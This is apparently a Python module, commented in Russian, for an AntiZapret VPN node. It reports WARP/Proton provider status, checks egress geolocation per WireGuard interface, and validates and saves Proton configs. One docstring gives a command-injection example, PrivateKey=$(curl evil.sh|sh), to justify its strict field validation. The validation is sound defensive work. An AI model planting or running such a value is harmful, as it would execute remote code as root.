"""WARP geo-check + provider status for a single AntiZapret node.

Читает только безопасные для отображения поля из /root/antizapret/setup
(WARP_PROVIDER, ANTIZAPRET_WARP, VPN_WARP, факт заполненности Proton-ключей —
никогда сами ключи) и умеет проверить, каким гео/страной видят исходящий
трафик сервера внешние сервисы (Cloudflare trace, YouTube GL-поле) —
привязываясь к конкретному WARP-интерфейсу через `curl --interface`, а не
просто к маршруту по умолчанию, чтобы результат отражал то, что реально
увидит клиент через этот egress, а не сырой IP хоста.
"""

from __future__ import annotations

import re
import subprocess
from pathlib import Path
from typing import Literal

CURL_TIMEOUT_SECONDS = 10
GeoScope = Literal["antizapret", "vpn", "raw"]

_SCOPE_INTERFACE = {
    "antizapret": "warp-antizapret",
    "vpn": "warp-vpn",
    "raw": None,
}

_YOUTUBE_GL_RE = re.compile(r'"GL"\s*:\s*"([A-Z]{2})"')
_TRACE_FIELD_RE = re.compile(r"^(ip|loc|colo)=(.*)$", re.MULTILINE)

_SAFE_SETUP_KEYS = {
    "WARP_PROVIDER",
    "ANTIZAPRET_WARP",
    "VPN_WARP",
}
_PROTON_PRESENCE_KEYS = {
    "PROTON_ANTIZAPRET_PRIVATE_KEY": "proton_antizapret_configured",
    "PROTON_VPN_PRIVATE_KEY": "proton_vpn_configured",
}
_PROTON_ADDRESS_KEY = {
    "antizapret": "PROTON_ANTIZAPRET_ADDRESS",
    "vpn": "PROTON_VPN_ADDRESS",
}
_IP_ADDR_RE = re.compile(r"inet (\d+\.\d+\.\d+\.\d+)/")


def _read_setup_file(antizapret_path: Path) -> dict[str, str]:
    setup_file = antizapret_path / "setup"
    values: dict[str, str] = {}
    if not setup_file.is_file():
        return values
    for line in setup_file.read_text(encoding="utf-8", errors="replace").splitlines():
        if "=" not in line or line.lstrip().startswith("#"):
            continue
        key, _, value = line.partition("=")
        values[key.strip()] = value.strip()
    return values


def read_warp_status(antizapret_path: Path) -> dict:
    """Безопасный снимок настроек WARP: без приватных ключей и эндпоинтов."""
    raw = _read_setup_file(antizapret_path)
    status: dict[str, object] = {key.lower(): raw.get(key, "") for key in _SAFE_SETUP_KEYS}
    for src_key, out_key in _PROTON_PRESENCE_KEYS.items():
        status[out_key] = bool(raw.get(src_key, "").strip())
    return status


def _run_curl(url: str, *, interface: str | None) -> tuple[bool, str]:
    args = ["curl", "-s", "-4", "--max-time", str(CURL_TIMEOUT_SECONDS)]
    if interface:
        args += ["--interface", interface]
    args.append(url)
    try:
        result = subprocess.run(args, capture_output=True, text=True, timeout=CURL_TIMEOUT_SECONDS + 5)
    except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
        return False, str(exc)
    if result.returncode != 0:
        return False, f"curl exit {result.returncode}: {result.stderr.strip()[:200]}"
    return True, result.stdout


def _interface_local_ip(interface: str) -> str | None:
    try:
        result = subprocess.run(
            ["ip", "-o", "addr", "show", interface],
            capture_output=True, text=True, timeout=5,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None
    if result.returncode != 0:
        return None
    match = _IP_ADDR_RE.search(result.stdout)
    return match.group(1) if match else None


def _check_tunnel_matches_config(scope: GeoScope, interface: str, antizapret_path: Path | None) -> dict:
    """Сверить реально поднятый IP туннеля с тем, что задан в setup для Proton.

    Реальный найденный случай: конфиг правят вручную (nano setup), но забывают
    выполнить up.sh - туннель продолжает жить со СТАРОЙ регистрацией (например,
    ещё Cloudflare, оставшийся от предыдущего провайдера) сколько угодно долго,
    хотя setup уже говорит Proton с валидными ключами. Без явного сравнения
    это выглядит как настоящий результат геопроверки, хотя на деле проверяется
    не тот провайдер вообще.
    """
    if antizapret_path is None:
        return {}
    raw = _read_setup_file(antizapret_path)
    if raw.get("WARP_PROVIDER", "").strip() != "proton":
        return {}
    expected_key = _PROTON_ADDRESS_KEY.get(scope)
    expected_ip = raw.get(expected_key, "").strip() if expected_key else ""
    if not expected_ip:
        return {}
    actual_ip = _interface_local_ip(interface)
    if actual_ip is None:
        return {}
    matches = actual_ip == expected_ip
    out: dict[str, object] = {"tunnel_matches_config": matches}
    if not matches:
        out["tunnel_mismatch_detail"] = (
            f"Туннель поднят с IP {actual_ip}, а в конфиге для Proton задан {expected_ip} - "
            "похоже, setup правили вручную, но /root/antizapret/up.sh не выполнялся. "
            "Результат проверки ниже может относиться к СТАРОМУ провайдеру, а не к Proton. "
            "Выполните up.sh на узле."
        )
    return out


_WG_KEY_RE = re.compile(r"^[A-Za-z0-9+/]{42,43}={1,2}$")
_HOST_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?$")
_IPV4_RE = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")

_PROTON_FIELD_KEYS = {
    "antizapret": {
        "private_key": "PROTON_ANTIZAPRET_PRIVATE_KEY",
        "public_key": "PROTON_ANTIZAPRET_PUBLIC_KEY",
        "address": "PROTON_ANTIZAPRET_ADDRESS",
        "endpoint_host": "PROTON_ANTIZAPRET_ENDPOINT_HOST",
        "endpoint_port": "PROTON_ANTIZAPRET_ENDPOINT_PORT",
    },
    "vpn": {
        "private_key": "PROTON_VPN_PRIVATE_KEY",
        "public_key": "PROTON_VPN_PUBLIC_KEY",
        "address": "PROTON_VPN_ADDRESS",
        "endpoint_host": "PROTON_VPN_ENDPOINT_HOST",
        "endpoint_port": "PROTON_VPN_ENDPOINT_PORT",
    },
}


class ProtonConfigError(ValueError):
    """Вставленный WireGuard-конфиг Proton не прошёл валидацию."""


def parse_proton_wg_conf(raw: str) -> dict[str, str]:
    """Разобрать вставленный WireGuard-конфиг Proton - порт parse_proton_wg_conf() из setup.sh.

    Строгая валидация каждого поля обязательна не только для UX (понятная ошибка
    вместо кривого тоннеля) - setup файл потом читается через `source setup` в
    bash (up.sh и другие скрипты). Значение вроде PrivateKey=$(curl evil.sh|sh)
    без валидации стало бы исполняемой командой при следующем up.sh. Каждое
    поле проверяется по строгому формату (base64-ключ/hostname/IPv4/порт) до
    того, как что-либо попадёт в файл.
    """
    fields: dict[str, str] = {}
    for line in raw.splitlines():
        line = line.strip()
        if not line or line.startswith("[") or line.startswith("#"):
            continue
        if "=" not in line:
            continue
        key, _, value = line.partition("=")
        fields[key.strip().lower()] = value.strip()

    private_key = fields.get("privatekey", "")
    public_key = fields.get("publickey", "")
    address_raw = fields.get("address", "")
    endpoint_raw = fields.get("endpoint", "")

    if not (private_key and public_key and address_raw and endpoint_raw):
        raise ProtonConfigError("В конфиге должны быть PrivateKey, PublicKey, Address и Endpoint")

    if not _WG_KEY_RE.match(private_key):
        raise ProtonConfigError("PrivateKey не похож на настоящий WireGuard-ключ")
    if not _WG_KEY_RE.match(public_key):
        raise ProtonConfigError("PublicKey не похож на настоящий WireGuard-ключ")

    address = address_raw.split(",")[0].strip().split("/")[0].strip()
    if not _IPV4_RE.match(address):
        raise ProtonConfigError(f"Address должен быть IPv4-адресом, получено: {address_raw!r}")

    if ":" not in endpoint_raw:
        raise ProtonConfigError("Endpoint должен быть в формате host:port")
    endpoint_host, _, endpoint_port = endpoint_raw.rpartition(":")
    if not _HOST_RE.match(endpoint_host):
        raise ProtonConfigError(f"Endpoint host некорректен: {endpoint_host!r}")
    if not endpoint_port.isdigit() or not (1 <= int(endpoint_port) <= 65535):
        raise ProtonConfigError(f"Endpoint port должен быть 1-65535, получено: {endpoint_port!r}")

    return {
        "private_key": private_key,
        "public_key": public_key,
        "address": address,
        "endpoint_host": endpoint_host,
        "endpoint_port": endpoint_port,
    }


def _write_setup_fields(antizapret_path: Path, updates: dict[str, str]) -> None:
    setup_file = antizapret_path / "setup"
    if not setup_file.is_file():
        raise FileNotFoundError(f"{setup_file} не найден")
    lines = setup_file.read_text(encoding="utf-8", errors="replace").splitlines()
    remaining = dict(updates)
    for i, line in enumerate(lines):
        if "=" not in line or line.lstrip().startswith("#"):
            continue
        key = line.split("=", 1)[0].strip()
        if key in remaining:
            lines[i] = f"{key}={remaining.pop(key)}"
    for key, value in remaining.items():
        lines.append(f"{key}={value}")
    setup_file.write_text("\n".join(lines) + "\n", encoding="utf-8")


def save_proton_config(scope: Literal["antizapret", "vpn"], raw_config: str, antizapret_path: Path) -> dict:
    """Разобрать, провалидировать и сохранить Proton-конфиг для одного scope.

    Не проверяет и не запускает up.sh - вызывающая сторона решает, когда
    применить (см. apply_warp_changes), чтобы можно было сохранить оба scope
    перед одним общим перезапуском тоннелей.
    """
    parsed = parse_proton_wg_conf(raw_config)

    other_scope = "vpn" if scope == "antizapret" else "antizapret"
    other_keys = _PROTON_FIELD_KEYS[other_scope]
    raw = _read_setup_file(antizapret_path)
    other_private_key = raw.get(other_keys["private_key"], "").strip()
    if other_private_key and other_private_key == parsed["private_key"]:
        raise ProtonConfigError(
            "Этот ключ уже используется для другого scope (antizapret/vpn) - Proton не даёт "
            "одновременно держать два туннеля на одном ключе, вставьте другой конфиг."
        )

    field_keys = _PROTON_FIELD_KEYS[scope]
    updates = {field_keys[name]: value for name, value in parsed.items()}
    _write_setup_fields(antizapret_path, updates)
    return {"success": True, "scope": scope}


def set_warp_provider(provider: Literal["proton", "cloudflare"], antizapret_path: Path) -> dict:
    _write_setup_fields(antizapret_path, {"WARP_PROVIDER": provider})
    return {"success": True, "warp_provider": provider}


def apply_warp_changes(antizapret_path: Path) -> dict:
    """Выполнить /root/antizapret/up.sh, чтобы применить смену провайдера/ключей.

    up.sh сам сначала вызывает down.sh - это кратко (секунды) обрывает ВСЕ
    активные тоннели на узле (не только WARP), не только выбранный scope.
    Тяжёлая операция для боевого узла, вызывающая сторона должна явно её
    запрашивать, а не гонять при каждом сохранении конфига.
    """
    up_sh = antizapret_path / "up.sh"
    if not up_sh.is_file():
        return {"success": False, "output": f"{up_sh} не найден"}
    try:
        result = subprocess.run(
            [str(up_sh)], cwd=str(antizapret_path),
            capture_output=True, text=True, timeout=60,
        )
    except subprocess.TimeoutExpired as exc:
        return {"success": False, "output": f"up.sh не завершился за 60с: {exc}"}
    output = (result.stdout or "") + (result.stderr or "")
    return {"success": result.returncode == 0, "output": output.strip()[-4000:]}


def check_warp_geo(scope: GeoScope, antizapret_path: Path | None = None) -> dict:
    """Проверить гео исходящего трафика для scope (antizapret/vpn/raw).

    Для antizapret/vpn привязывается через `curl --interface warp-*` к
    реальному WARP-интерфейсу - если он сейчас не поднят (провайдер Proton
    без активного WARP, или ANTIZAPRET_WARP=1/none), возвращает понятную
    ошибку вместо гео сырого IP хоста, которое может ввести в заблуждение.
    """
    interface = _SCOPE_INTERFACE[scope]
    result: dict[str, object] = {"scope": scope, "interface": interface}

    if interface:
        result.update(_check_tunnel_matches_config(scope, interface, antizapret_path))

    ok, trace_out = _run_curl("https://1.1.1.1/cdn-cgi/trace", interface=interface)
    if not ok:
        result["error"] = (
            f"Интерфейс {interface} недоступен или не поднят"
            if interface
            else "Не удалось обратиться к 1.1.1.1"
        ) + f" ({trace_out[:200]})"
        return result

    for match in _TRACE_FIELD_RE.finditer(trace_out):
        field, value = match.group(1), match.group(2)
        result[f"cloudflare_{field}"] = value

    ok_yt, yt_out = _run_curl("https://www.youtube.com/", interface=interface)
    youtube_gl = None
    if ok_yt:
        gl_match = _YOUTUBE_GL_RE.search(yt_out)
        if gl_match:
            youtube_gl = gl_match.group(1)
    result["youtube_gl"] = youtube_gl

    country = result.get("cloudflare_loc")
    flagged_values = [v for v in (country, youtube_gl) if v]
    result["flagged_as_ru"] = any(v == "RU" for v in flagged_values)
    result["checked_fields"] = len(flagged_values)
    return result
